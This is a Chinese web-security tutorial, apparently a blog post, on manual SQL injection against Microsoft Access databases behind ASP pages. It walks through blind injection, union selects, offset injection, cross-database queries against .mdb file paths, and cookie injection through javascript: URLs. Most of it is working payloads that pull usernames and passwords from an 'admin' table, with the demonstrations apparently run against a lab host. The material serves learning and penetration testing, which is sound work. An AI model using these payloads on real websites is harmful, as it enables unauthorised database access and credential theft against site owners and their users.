-<p>在Office 2007之前的Access数据库文件的后缀是 <strong>.mdb</strong> ，Office2007及其之后的Access数据库文件的后缀是 <strong>.accdb</strong> 。</p>
-<p>Access数据库中没有注释符号，因此 /**/ 、 – 和 # 都没法使用。</p>
-<p>Access是小型数据库，当容量到达100M左右的时候性能就会开始下降。</p>
-<p>Access数据库不支持错误显示注入，Access数据库不能执行系统命令。</p>
-<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> len(&quot;string&quot;)        查询给定字符串的长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">asc</span>(&quot;a&quot;)             查询给定字符串的ascii值</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> mid(&quot;string&quot;,<span class="number">2</span>,<span class="number">1</span>)    查询给定字符串从指定索引开始的长度</span><br><span class="line"></span><br><span class="line">top  n                      查询前n条记录</span><br></pre></td></tr></table></figure>
-
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>可以使用如下方法来判断：</p>
-<ul>
-<li>特殊符号，\、/、’、”等。</li>
-<li>-0 减数字看是否变化。</li>
-<li>逻辑关系，<code>and 1=1</code> <code>and 1=2</code></li>
-</ul>
-<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>asp一般搭载access或者mssql，首先得判断出来是哪一类数据库。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists (select * from msysobjects)</span><br></pre></td></tr></table></figure>
-
-<p>正常回显即为access数据库，如果报错可看报错信息来判断是否在access数据库。</p>
-<p>报出以下错误说明该数据库存在<code>msysobjects</code>这张数据表，说明该数据库为Access</p>
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/37626e4fe2f47655dcf67dfcea2d3bc2.png" alt="37626e4fe2f47655dcf67dfcea2d3bc2.png"></p>
-<p>下面这个为sqlserver的判断语句</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from sysobjects)</span><br></pre></td></tr></table></figure>
-
-<h3 id="猜表名与字段名"><a href="#猜表名与字段名" class="headerlink" title="猜表名与字段名"></a>猜表名与字段名</h3><p><strong>猜解表名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from admin)</span><br></pre></td></tr></table></figure>
-
-<p><strong>猜解字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select user from admin)</span><br></pre></td></tr></table></figure>
-
-<p>由于access的系统表不像mysql一样具有系统索引库，所以表名和列名都只能靠猜……如果通过社工、工具、经验（比如看后台源码的表单名字）都搞不出来的话，就只能通过偏移注入来试试运气了。</p>
-<h3 id="逐字猜解数据"><a href="#逐字猜解数据" class="headerlink" title="逐字猜解数据"></a>逐字猜解数据</h3><p><strong>猜解一张表中有多少条记录</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select count(*) from admin)&gt;3</span><br></pre></td></tr></table></figure>
-
-<p><strong>猜解字段内容长度</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select len(user) from admin)=5</span><br></pre></td></tr></table></figure>
-
-<p><strong>猜解字段内容数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select top 1 asc(mid(user,1,1)) from admin)&gt;95</span><br></pre></td></tr></table></figure>
-
-<h2 id="联合查找注入"><a href="#联合查找注入" class="headerlink" title="联合查找注入"></a>联合查找注入</h2><h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 11</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/90342b450e3ec99476523036222783f6.png" alt="90342b450e3ec99476523036222783f6.png"></p>
-<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11 from admin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/29085dfd90b5fd67fd8f7629d1c850be.png" alt="29085dfd90b5fd67fd8f7629d1c850be.png"></p>
-<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,s_user,s_pwd,6,7,8,9,10,11 from admin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/852a57eed1f78e57db355b80fe3504f2.png" alt="852a57eed1f78e57db355b80fe3504f2.png"></p>
-<h2 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。</p>
-<p>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p>
-<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><ul>
-<li>假设一个表有8个字段，admin表有3个字段。</li>
-<li>联合查询payload：union select 1,2,3,4,5,6,7,8 from admin</li>
-<li>在我们不知道admin有多少字段的情况下可以尝试payload：<code>union select 1,2,3,4,5,6,7,admin.* from admin</code>，此时页面出错</li>
-<li>直到payload：<code>union select 1,2,3,4,5,admin.* from admin</code>时页面返回正常，说明admin表有三个字段</li>
-<li>然后通过移动admin.*的位置，就可以回显不同的数据</li>
-</ul>
-<h3 id="判断查询列数-1"><a href="#判断查询列数-1" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 38</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/12bb577bfb8ed7fd6e22b1cc1f798ebf.png" alt="12bb577bfb8ed7fd6e22b1cc1f798ebf.png"></p>
-<h3 id="判断回显位-1"><a href="#判断回显位-1" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38 from admin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/dcd9b04d83b81ddf09a3a1bfa647925e.png" alt="dcd9b04d83b81ddf09a3a1bfa647925e.png"></p>
-<h3 id="判断表内存在的字段个数"><a href="#判断表内存在的字段个数" class="headerlink" title="判断表内存在的字段个数"></a>判断表内存在的字段个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,* from admin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/06b7c720180477547b3b2f9462601179.png" alt="06b7c720180477547b3b2f9462601179.png"></p>
-<p>发现报错，我们将<code>*</code>位向左移，直到回显正常</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8204/show.asp?pkid=4821 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,* from admin</span><br></pre></td></tr></table></figure>
-
-<p><img src="/:/f06a8c98c2fc458f905a8d7c9bf9c5ee" alt="2ee3f68b1695aa7ba65e3ae2a5c67109.png"></p>
-<p>发现<code>*</code>在27之后可以正常回显，计算表内查询字段数：38-27=<strong>11</strong></p>
-<p>其中还报出了一个数据：admin</p>
-<h3 id="偏移注入爆出数据"><a href="#偏移注入爆出数据" class="headerlink" title="偏移注入爆出数据"></a>偏移注入爆出数据</h3><blockquote>
-<p>偏移注入公式：</p>
-<ul>
-<li>查询字段数：* = 11</li>
-<li>一级偏移数：38 - 11 = 27</li>
-<li>二级偏移数：38 - 11×2 = 16</li>
-<li>三级偏移数：38 - 11×3 = 5</li>
-</ul>
-</blockquote>
-<p><strong>二级偏移</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from (admin as a inner join admin as b on a.id=b.id)</span><br></pre></td></tr></table></figure>
-
-<p>发现多爆出一个数据（虽然没什么用）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/83ce49b0e9d2e2eaeb1a96332cdeac26.png" alt="83ce49b0e9d2e2eaeb1a96332cdeac26.png"></p>
-<p><strong>三级偏移</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/21ac4b9cbc6904c04613f41ee3e3664e.png" alt="21ac4b9cbc6904c04613f41ee3e3664e.png"></p>
-<h2 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h2><p>同服务器下的站点有注入，知道对方站的数据库绝对路径，知道对方数据库表，表中的字段名可以用这个方法来进行跨库查询。</p>
-<p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,admin,3,password,5,6,7,8,9,10,11,12,13,14 from [C:\WebCode\sze7xiaohu.mdb].admin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/c8ac1fe68934b7a264a31c9fe0061ca8.png" alt="c8ac1fe68934b7a264a31c9fe0061ca8.png"></p>
-<h2 id="Cookie手工注入"><a href="#Cookie手工注入" class="headerlink" title="Cookie手工注入"></a>Cookie手工注入</h2><p>cookie注入的原理其实并不复杂。学过ASP语言的应该都知道，在ASP中 例如：</p>
-<p><code>id=request.querystring(ID);</code> <code>id=request.form(ID);</code></p>
-<p>在正常情况下程序员应该按以上规范进行代码的编写，但是部分程序员，为了方便却将代码写成了如下格式：</p>
-<p><code>id=request(ID);</code></p>
-<p>虽然此时也加了防注入程序。但是，防注入程序并不支持基于cookie提交的数据。而此时代码由于接受任何提交方式，从而导致了cookie注入的产生！下面我来简单演示下cookie手工注入的过程。</p>
-<p>首先，我们在存在cookie注入的页面，按其正常地址进行一次完整的访问。完整访问是为了收集其cookie。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/00bb0ba54e30d917e0d075f1930909f6.png" alt="00bb0ba54e30d917e0d075f1930909f6.png"></p>
-<p>接着，我们使用JS代码在地址栏将原先的地址替换为如下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26&quot;));</span><br></pre></td></tr></table></figure>
-
-<p>注：不能直接粘贴，直接粘贴浏览器会自动查询，可以先手动输入javascrip:再粘贴后面的部分。火狐浏览器不支持地址栏JavaScript伪协议，可以在Chrome浏览器中使用。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/01faa58d37eff6773bc66d514473c264.png" alt="01faa58d37eff6773bc66d514473c264.png"></p>
-<p>此时，我们打开一个新页面，将之前存在注入的页面地址拷贝到地址栏。注意：这里将后面的id 参数去除后，再进行访问！如图。页面如果依然返回正常，则说明cookie 修改成功！</p>
-<h3 id="构造Cookie注入页面与判断注入点"><a href="#构造Cookie注入页面与判断注入点" class="headerlink" title="构造Cookie注入页面与判断注入点"></a>构造Cookie注入页面与判断注入点</h3><p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/67fb74e1e860392e2ac9597189b985a5.png" alt="67fb74e1e860392e2ac9597189b985a5.png"></p>
-<p>and 1=1</p>
-<p>刷新后页面正常显示</p>
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061042627.png" alt="37d851bb273e68857fe54f2f04aa5a80.png"></p>
-<p>and 1=2</p>
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/f920179cb4bbe8e702f0d83f2e5cd977.png" alt="f920179cb4bbe8e702f0d83f2e5cd977.png"></p>
-<p>刷新后页面报错</p>
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061043124.png" alt="bb70c283af7fd32c357d10c6060c6446.png"></p>
-<p>在证明确实存在注入后，我们就可以开始猜它的列数了。</p>
-<h3 id="判断查询列数-2"><a href="#判断查询列数-2" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 order by 11&quot;));</span><br></pre></td></tr></table></figure>
-
-<h3 id="判断回显位-2"><a href="#判断回显位-2" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,2,3,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>
-
-<h3 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,username,password,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/ee9bf1be05fbedb60937a69027ca9399.png" alt="ee9bf1be05fbedb60937a69027ca9399.png"></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
